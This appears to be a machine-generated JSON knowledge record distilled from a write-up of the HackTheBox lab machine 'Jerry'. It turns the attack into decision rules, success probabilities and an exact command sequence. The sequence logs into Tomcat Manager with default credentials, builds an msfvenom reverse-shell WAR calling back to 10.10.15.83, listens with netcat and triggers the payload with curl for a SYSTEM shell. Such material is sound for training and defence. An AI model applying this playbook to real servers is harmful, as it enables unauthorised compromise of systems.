{
  "writeup_id": "Htb_Jerry",
  "scenario_fingerprint": {
    "scenario_name": "tomcat_default_credentials_war_upload",
    "primary_services": [
      "http",
      "tomcat"
    ],
    "port_signature": "8080",
    "service_combination": "tomcat_manager",
    "os_family": "windows",
    "environment_type": "web_application_server",
    "entry_vector": "default_credentials",
    "privilege_path": "direct_system_shell",
    "attack_complexity": "trivial",
    "estimated_time": "5-10 minutes",
    "scenario_confidence": 0.98,
    "distinguishing_factors": [
      "tomcat_default_install",
      "manager_application_enabled",
      "default_credentials_tomcat_s3cret",
      "war_file_upload_capability"
    ],
    "environmental_clues": [
      "apache_tomcat_banner",
      "manager_application_accessible",
      "single_port_8080_open",
      "default_tomcat_homepage"
    ],
    "similar_scenarios": [
      "manager_htb_easy",
      "tabby_htb_easy"
    ],
    "unique_aspects": [
      "immediate_system_privileges",
      "single_service_exploitation",
      "no_privilege_escalation_needed"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Default Credential Attack",
        "success_reason": "Tomcat Manager used default credentials tomcat/s3cret",
        "prerequisite_indicators": [
          "tomcat_service_running",
          "manager_interface_accessible",
          "default_installation_detected"
        ],
        "recognition_patterns": [
          "default tomcat homepage visible",
          "manager app link present",
          "no custom branding or hardening signs",
          "standard port 8080 usage"
        ],
        "failure_modes": [
          "credentials_changed_from_default",
          "manager_interface_disabled",
          "ip_restrictions_in_place",
          "account_lockout_policies"
        ],
        "environmental_factors": [
          "default_tomcat_installation",
          "no_security_hardening",
          "development_or_test_environment",
          "insufficient_access_controls"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "2-5 minutes"
      },
      {
        "technique": "WAR File Upload RCE",
        "success_reason": "Manager interface allowed malicious WAR deployment with system privileges",
        "prerequisite_indicators": [
          "manager_access_obtained",
          "war_deployment_enabled",
          "tomcat_running_as_system"
        ],
        "recognition_patterns": [
          "WAR file deployment section visible",
          "no upload restrictions",
          "msfvenom payload generation successful",
          "jsp execution context available"
        ],
        "failure_modes": [
          "upload_restrictions_in_place",
          "code_execution_blocked",
          "tomcat_running_unprivileged",
          "application_whitelisting_active"
        ],
        "environmental_factors": [
          "tomcat_running_as_system",
          "no_application_restrictions",
          "jsp_execution_enabled",
          "unrestricted_file_upload"
        ],
        "success_probability": 0.95,
        "typical_timeframe": "3-8 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Tomcat Manager with default credentials",
        "discovery_method": "Manual credential testing on manager interface",
        "why_critical": "Direct path to code execution via WAR upload",
        "how_to_recognize": [
          "default tomcat installation page",
          "manager app link accessible",
          "common credential patterns work",
          "no custom authentication mechanisms"
        ],
        "follow_up_actions": [
          "generate_malicious_war_file",
          "upload_via_manager_interface",
          "trigger_payload_execution",
          "establish_reverse_shell"
        ]
      },
      {
        "discovery": "System-level Tomcat service",
        "discovery_method": "whoami command after shell establishment",
        "why_critical": "Immediate system-level access without privilege escalation",
        "how_to_recognize": [
          "nt authority\\system in shell",
          "full administrative privileges",
          "access to all system directories",
          "no UAC or privilege restrictions"
        ],
        "follow_up_actions": [
          "collect_system_information",
          "access_user_directories",
          "retrieve_flags_and_sensitive_data",
          "establish_persistence_if_needed"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "unauthenticated",
        "escalation_method": "Default_Credentials_to_System",
        "why_possible": "Tomcat service running as SYSTEM with default manager credentials",
        "recognition_signs": [
          "default_tomcat_installation_page",
          "manager_interface_accessible",
          "no_custom_security_configurations",
          "standard_port_and_service_setup"
        ],
        "exploitation_path": "Default Creds → Manager Access → WAR Upload → System Shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found only port 8080 open running Apache Tomcat",
        "decision": "Immediately test for default Tomcat manager credentials",
        "reasoning": "Tomcat manager with default creds is extremely common and provides direct code execution",
        "confidence": 0.95,
        "alternatives": [
          {
            "option": "directory_bruteforce",
            "when": "if default creds fail"
          },
          {
            "option": "tomcat_version_exploits",
            "when": "if manager inaccessible"
          }
        ],
        "success_indicators": [
          "manager_login_successful",
          "war_deployment_interface_accessible"
        ],
        "next_decision": "create_malicious_war_file"
      },
      {
        "step": 2,
        "situation": "Tomcat Manager access obtained with default credentials",
        "decision": "Create and deploy malicious WAR file for immediate shell",
        "reasoning": "WAR deployment provides direct code execution as system service account",
        "confidence": 0.98,
        "prerequisites": [
          "tomcat_manager_access",
          "war_deployment_enabled"
        ],
        "success_indicators": [
          "war_file_deployed",
          "jsp_page_accessible"
        ],
        "failure_fallbacks": [
          "alternative_war_payloads",
          "jsp_webshell_upload"
        ]
      }
    ],
    "branching_logic": {
      "if_default_creds_work": {
        "action": "immediate_war_deployment",
        "tools": [
          "msfvenom",
          "curl",
          "netcat"
        ],
        "next_phase": "system_shell_obtained"
      },
      "if_default_creds_fail": {
        "action": "credential_bruteforce_or_exploit_search",
        "alternatives": [
          "hydra_tomcat_manager",
          "tomcat_cve_exploits",
          "directory_enumeration"
        ],
        "decision_criteria": "based_on_tomcat_version_and_configuration"
      },
      "if_war_deployed_successfully": {
        "action": "trigger_payload_execution",
        "method": "curl_jsp_endpoint",
        "expected_result": "reverse_shell_as_system"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_tomcat_default_creds_first",
        "reasoning": "extremely_high_success_rate_and_immediate_system_access",
        "applicability": "any_tomcat_installation_found"
      },
      {
        "rule": "use_msfvenom_war_payload_for_tomcat_manager",
        "reasoning": "reliable_execution_and_handles_platform_detection",
        "applicability": "tomcat_manager_war_deployment_available"
      },
      {
        "rule": "extract_jsp_filename_from_war_before_deployment",
        "reasoning": "required_for_payload_activation_via_http_request",
        "applicability": "custom_war_file_creation"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Tomcat Manager Default Credentials",
        "mitre_id": "T1078.001",
        "required_services": [
          "http",
          "tomcat"
        ],
        "required_ports": [
          8080,
          8443,
          80,
          443
        ],
        "os_requirements": [
          "windows",
          "linux"
        ],
        "environmental_prerequisites": [
          "tomcat_manager_accessible",
          "default_credentials_unchanged",
          "manager_application_enabled"
        ],
        "success_indicators": [
          "tomcat_manager_login_successful",
          "war_deployment_interface_available",
          "application_list_visible"
        ],
        "incompatible_with": [
          "custom_authentication_configured",
          "manager_application_disabled",
          "network_access_restricted"
        ],
        "confidence_boosters": [
          "default_tomcat_installation_page",
          "apache_coyote_banner",
          "standard_tomcat_ports"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "2-5 minutes"
      },
      {
        "technique": "WAR File Upload RCE",
        "mitre_id": "T1505.003",
        "required_services": [
          "tomcat"
        ],
        "required_ports": [
          8080,
          8443
        ],
        "os_requirements": [
          "windows",
          "linux"
        ],
        "environmental_prerequisites": [
          "tomcat_manager_access",
          "war_deployment_enabled",
          "write_permissions_to_webapps"
        ],
        "success_indicators": [
          "war_file_uploaded_successfully",
          "application_deployed_status",
          "jsp_endpoint_accessible"
        ],
        "incompatible_with": [
          "deployment_restrictions_enabled",
          "insufficient_disk_space",
          "antivirus_blocking_uploads"
        ],
        "confidence_boosters": [
          "manager_gui_available",
          "deploy_section_visible",
          "existing_applications_listed"
        ],
        "typical_success_rate": 0.95,
        "estimated_time": "3-8 minutes"
      }
    ],
    "environmental_detectors": {
      "tomcat_server": {
        "port_indicators": [
          8080,
          8443,
          8009
        ],
        "service_indicators": [
          "http",
          "tomcat",
          "jsp"
        ],
        "banner_indicators": [
          "Apache Tomcat",
          "Coyote",
          "JSP engine"
        ],
        "confidence_threshold": 0.9
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "apache",
          "nginx",
          "iis",
          "tomcat"
        ],
        "confidence_threshold": 0.85
      },
      "windows_target": {
        "port_indicators": [
          135,
          139,
          445,
          3389
        ],
        "service_indicators": [
          "smb",
          "rpc",
          "rdp"
        ],
        "banner_indicators": [
          "Windows",
          "Microsoft"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "tomcat_default_credentials",
          "when": "tomcat_service_detected",
          "reason": "extremely_high_success_rate_quick_execution"
        },
        {
          "attack": "war_file_upload",
          "when": "tomcat_manager_access_gained",
          "reason": "direct_code_execution_system_level_access"
        }
      ],
      "medium_priority": [
        {
          "attack": "directory_bruteforce",
          "when": "web_service_detected_no_manager_access",
          "reason": "may_reveal_admin_interfaces"
        },
        {
          "attack": "version_specific_exploits",
          "when": "tomcat_version_identified",
          "reason": "known_vulnerabilities_may_exist"
        }
      ],
      "low_priority": [
        {
          "attack": "credential_bruteforce",
          "when": "default_credentials_failed",
          "reason": "time_intensive_lower_success_rate"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Default Credential Access",
        "mitre_id": "T1078.001",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "web_browser",
            "command_template": "Navigate to http://{target}:8080/manager/html",
            "actual_command": "http://10.10.10.95:8080/manager/html",
            "credentials_used": "tomcat:s3cret",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "tomcat_manager_accessible",
          "default_credentials_unchanged"
        ],
        "success_indicators": [
          "manager_interface_accessible",
          "war_deployment_capability_available"
        ],
        "common_failures": [
          "credentials_changed_from_default",
          "manager_interface_disabled",
          "ip_restrictions_in_place"
        ],
        "follow_up_techniques": [
          "war_file_deployment",
          "reverse_shell_execution"
        ],
        "time_investment": "1-5 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "WAR File Malicious Deployment",
        "mitre_id": "T1505.003",
        "category": "persistence",
        "phase": "execution",
        "tools_used": [
          {
            "name": "msfvenom",
            "command_template": "msfvenom -p windows/shell_reverse_tcp LHOST={attacker_ip} LPORT={port} -f war > {filename}.war",
            "actual_command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war",
            "output_pattern": "Final size of war file: {size} bytes",
            "effectiveness_rating": 5,
            "reliability": 0.98
          },
          {
            "name": "jar",
            "command_template": "jar -ft {war_file}",
            "actual_command": "jar -ft rev_shell-9002.war",
            "purpose": "Extract JSP filename for activation",
            "effectiveness_rating": 4,
            "reliability": 1.0
          },
          {
            "name": "curl",
            "command_template": "curl http://{target}:8080/{war_name}/{jsp_file}",
            "actual_command": "curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp",
            "purpose": "Trigger payload execution",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "tomcat_manager_access",
          "war_deployment_permissions",
          "network_connectivity_for_reverse_shell"
        ],
        "success_indicators": [
          "war_file_uploaded_successfully",
          "jsp_accessible_via_http",
          "reverse_shell_connection_established"
        ],
        "common_failures": [
          "war_file_deployment_restrictions",
          "firewall_blocking_reverse_connection",
          "antivirus_detection"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "persistence_establishment",
          "lateral_movement"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "msfvenom",
        "use_case": "war_payload_generation",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "web_application_exploitation"
        ],
        "alternatives": [
          "manual_jsp_creation",
          "custom_war_building"
        ],
        "best_practices": [
          "verify_target_architecture",
          "test_payload_locally_first",
          "use_staged_payloads_for_large_environments"
        ]
      },
      {
        "tool": "netcat",
        "use_case": "reverse_shell_listener",
        "effectiveness_rating": 5,
        "reliability": 1.0,
        "learning_curve": "low",
        "essential_for": [
          "reverse_shell_operations"
        ],
        "alternatives": [
          "metasploit_handler",
          "socat",
          "custom_listeners"
        ],
        "best_practices": [
          "start_listener_before_triggering_payload",
          "use_rlwrap_for_better_shell_interaction",
          "have_backup_listeners_ready"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "tomcat_default_creds_to_system_shell",
        "steps": [
          {
            "step": 1,
            "command": "nmap -sT -p- --min-rate 5000 10.10.10.95",
            "purpose": "Identify open ports",
            "expected_output": "8080/tcp open http-proxy"
          },
          {
            "step": 2,
            "command": "Navigate to http://10.10.10.95:8080/manager/html with tomcat:s3cret",
            "purpose": "Access Tomcat Manager",
            "expected_output": "Manager interface accessible"
          },
          {
            "step": 3,
            "command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war",
            "purpose": "Generate malicious WAR file",
            "expected_output": "Final size of war file: 52311 bytes"
          },
          {
            "step": 4,
            "command": "jar -ft rev_shell-9002.war",
            "purpose": "Extract JSP filename",
            "expected_output": "ppaejmsg.jsp"
          },
          {
            "step": 5,
            "command": "nc -lnvp 9002",
            "purpose": "Start reverse shell listener",
            "expected_output": "listening on [any] 9002"
          },
          {
            "step": 6,
            "command": "Upload WAR via manager interface",
            "purpose": "Deploy malicious application",
            "expected_output": "Application deployed successfully"
          },
          {
            "step": 7,
            "command": "curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp",
            "purpose": "Trigger payload execution",
            "expected_output": "Shell as nt authority\\system"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "6-15 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Jerry",
      "difficulty": "Easy",
      "os": "Windows",
      "platform": "HackTheBox",
      "release_date": "2018-06-30",
      "author": "mrh4sh",
      "estimated_time": "10-15 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "very_low",
      "skill_level_required": "absolute_beginner",
      "primary_attack_vectors": [
        "default_credentials",
        "web_application_deployment"
      ],
      "key_vulnerabilities": [
        "default_tomcat_credentials",
        "unrestricted_war_deployment"
      ],
      "environment_type": "web_application_server",
      "real_world_relevance": "high",
      "learning_value": [
        "tomcat_exploitation",
        "war_file_deployment",
        "basic_web_attacks"
      ],
      "prerequisite_knowledge": [
        "basic_web_concepts",
        "file_upload_attacks"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "default_credentials",
        "file_upload",
        "tomcat"
      ],
      "attack_types": [
        "initial_access",
        "execution"
      ],
      "defensive_lessons": [
        "change_default_credentials",
        "restrict_manager_access",
        "disable_unused_services"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Blue",
        "Legacy",
        "Devel"
      ],
      "similarity_reasons": [
        "beginner_friendly",
        "single_vulnerability",
        "quick_exploitation"
      ],
      "unique_aspects": [
        "tomcat_manager",
        "war_file_deployment",
        "extremely_fast_root"
      ],
      "difficulty_factors": [
        "default_credentials",
        "direct_system_access",
        "no_privilege_escalation_needed"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T00:02:37.260634",
    "original_file": "0xdf_writeups/Htb Jerry.md",
    "content_length": 15480,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}